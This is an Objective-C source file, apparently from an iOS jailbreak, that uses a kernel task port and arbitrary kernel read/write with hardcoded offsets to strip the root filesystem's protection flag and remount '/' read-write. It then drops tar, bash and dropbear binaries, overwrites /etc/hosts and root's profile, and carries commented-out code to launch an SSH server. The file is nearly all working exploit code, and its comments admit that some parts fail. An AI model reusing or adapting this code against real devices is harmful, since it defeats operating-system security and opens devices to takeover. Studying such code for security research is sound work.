/*
 * set.m - High-level handler to set boot nonce
 *
 * Copyright (c) 2017 Siguza & tihmstar
 */

#include <errno.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

#include "arch.h"
#include "exploit64.h"
#include "load_payload.h"

#include "getshell.h"
#include "libjb.h"

#include <dlfcn.h>
#include <copyfile.h>
#include <stdio.h>
#include <spawn.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/utsname.h>


#include "kpp.h"

// For '/' remount (not offsets)
#define OFFSET_ROOT_MOUNT_V_NODE 0xffffff8004536070 // nm kernelcache-decrypt-6s-n71ap-9.3  | grep -E " _rootvnode$"
#define OFFSET_TEXT_HEADER 0xFFFFFF8004004000 // IDA, go view -> open subviews -> segments and find the __TEXT:HEADER segment,the start should be FFFFFF8004004000


int file_exist (char *filename)
{
	struct stat   buffer;
	return (stat (filename, &buffer) == 0);
}


// remount root partition r/W
int remount_rw(task_t tfp0, vm_address_t kbase) {
	
	// Need these so struct vnode is properly defined:
	/* 0x00 */   LIST_HEAD(buflists, buf);
	/* 0x10 */   typedef  void *kauth_action_t ;
	/* 0x18 */   typedef  struct {
		uint64_t    x[2];
		/* 0x28 */   } lck_mtx_t;
	#if 0   // Cut/paste struct vnode (bsd/sys/vnode_internal.h) here (omitted for brevity)
	struct vnode {
	/* 0x00 */  lck_mtx_t v_lock;
	/* 0x28 */  TAILQ_ENTRY(vnode) v_freelist;
	/* 0x38 */  TAILQ_ENTRY(vnode) v_mntvnodes;
	/* 0x48 */  TAILQ_HEAD(, namecache) v_ncchildren; /* name cache entries that regard us as their pare
	/* 0x58 */  LIST_HEAD(, namecache) v_nclinks;     /* name cache entries that name this vnode */
	....
	/* 0xd8 */  mount_t v_mount;                      /* ptr to vfs we are in */
	};
	// mount_t (struct mount *) can similarly be obtained from bsd/sys/mount_internal.h
	//  The specific mount flags are a uint32_t at offset 0x70
	#endif

	// prepare kernel r/w
	prepare_rwk_via_tfp0(tfp0);
	
	//read rootfs_vnode from memory
	uint64_t rootfs_vnode = ReadAnywhere64(OFFSET_ROOT_MOUNT_V_NODE - OFFSET_TEXT_HEADER + kbase);
	vm_offset_t vmount_offset = 0xd0;
	vm_offset_t vflag_offset = 0x71;
	
    // remove mnt_rootfs flag
	uint64_t v_mount = ReadAnywhere64(rootfs_vnode + vmount_offset);
	uint32_t v_flag = ReadAnywhere32(v_mount + vflag_offset);
	WriteAnywhere32(v_mount + vflag_offset, v_flag & ~(1 << 6));
    
	// remount it
	char* nmz = strdup("/dev/disk0s1s1");
	int rv = mount( "hfs", "/", MNT_UPDATE, (void*)&nmz);
	printf("RC: %d (flags: 0x%x) %s \n", rv, v_flag, strerror(errno));
	
    // set it back
	v_mount = ReadAnywhere64(rootfs_vnode + vmount_offset);
	WriteAnywhere32(v_mount + vflag_offset, v_flag);
	
	int fd = open("/.bit_of_fun", O_RDONLY);
	if (fd == -1) {
		fd = creat("/.bit_of_fun", 0644);
	} else {
		printf("File already exists!\n");
	}
	close(fd);
	printf("Did we mount / as read+write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
	return rv;
}


static int party_hard(void)
{
	int ret = -1;
	if(getuid() != 0) // Skip if we got root already
	{
			vm_address_t kbase = 0;
			task_t kernel_task = get_kernel_task(&kbase);
			LOG("kernel_task: 0x%x", kernel_task);
			printf("kernel base:  0x%lx\n",kbase);
			ret = remount_rw(kernel_task, kbase); //do not work, operation not permitteds
	 }
	return ret;
}


bool load_payload(void){


	NSString *ver = [[NSProcessInfo processInfo] operatingSystemVersionString];
	
	struct utsname u;
	uname(&u);
	LOG("Device Name: %s", u.version);
	LOG("Device: %s", u.machine);
	LOG("iOS Version: %@", ver);

	if(party_hard() == 0){
		
		char path[4096];
		uint32_t size = sizeof(path);
		_NSGetExecutablePath(path, &size);
		char *pt = realpath(path, NULL);
		
		NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];
		
		
		NSString *tar = [execpath stringByAppendingPathComponent:@"tar-sig"];
		NSString *bash = [execpath stringByAppendingPathComponent:@"bash-arm64-sig"];
		NSString *dropbear = [execpath stringByAppendingPathComponent:@"dropbear-sig"];
		NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
		NSString *profile = [execpath stringByAppendingPathComponent:@"profile"];
		NSString *hosts = [execpath stringByAppendingPathComponent:@"hosts"];
		//NSString *kernelcache = [execpath stringByAppendingPathComponent:@"kernelcache-decrypt-6s-n71ap-9.3"];
		
		chdir("/tmp");
		mkdir("/tmp/etc", 0775);
		mkdir("/tmp/etc/dropbear", 0775);
		
		// copy file
		copyfile([tar UTF8String], "/tmp/tar-sig", 0, COPYFILE_ALL);
		//copyfile([bash UTF8String], "/bin/sh", 0, COPYFILE_ALL);
		copyfile([bash UTF8String], "/tmp/bash-arm64-sig", 0, COPYFILE_ALL);
		copyfile([dropbear UTF8String], "/tmp/dropbear-sig", 0, COPYFILE_ALL);
		copyfile([profile UTF8String], "/var/root/.profile", 0, COPYFILE_ALL);
		copyfile([hosts UTF8String], "/etc/hosts", 0, COPYFILE_ALL);
		//copyfile([kernelcache UTF8String], "/tmp/kernelcache-decrypt", 0, COPYFILE_ALL);
		
		//chmod
		chmod("/tmp/tar-sig", 0755);
		//  chmod("/bin/sh", 0755);
		chmod("/tmp/bash-arm64-sig", 0755);
		chmod("/tmp/dropbear-sig", 0755);
		

		/* using untar function to unzip bootstrap.tar */
		printf("untar and drop bootstrap.tar into /tmp\n");
		FILE *a = fopen([bootstrap UTF8String], "rb");
		chdir("/tmp");
		untar(a, "bootstrap");
		fclose(a);
		
		/* getshell */
		
        //getshell();
		
		/* exec cmd, need amfid injection, just commit now */
	//	int pd;
	/*	posix_spawn(&pd, "/tmp/tar-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/tar-sig", "--preserve-permissions", "--no-overwrite-dir", "-xf", [bootstrap UTF8String], NULL }, NULL);
		NSLog(@"pid = %x", pd);
		waitpid(pd, NULL, 0);
		sleep(1);
		*/
		
		//launch dropbear
		/*posix_spawn(&pd, "/tmp/dropbear-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/dropbear-sig", "-RE", "-p", "127.0.0.1:2222",NULL }, NULL);
		NSLog(@"pid = %x", pd);
		waitpid(pd, NULL, 0);
		*/
		
		return 0;
	
	}
	return 0;

}
